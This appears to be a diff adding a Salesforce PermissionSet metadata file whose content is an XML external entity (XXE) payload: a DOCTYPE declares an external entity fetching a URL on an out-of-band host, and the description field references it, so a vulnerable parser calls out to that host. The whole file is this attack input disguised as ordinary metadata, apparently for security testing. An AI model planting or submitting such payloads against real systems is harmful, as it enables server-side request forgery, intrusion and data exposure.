@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/permissionset"> ]>
+<PermissionSet xmlns="http://soap.sforce.com/2006/04/metadata"><description>&gsx;</description><hasActivationRequired>false</hasActivationRequired><label>GsXxePs</label></PermissionSet>
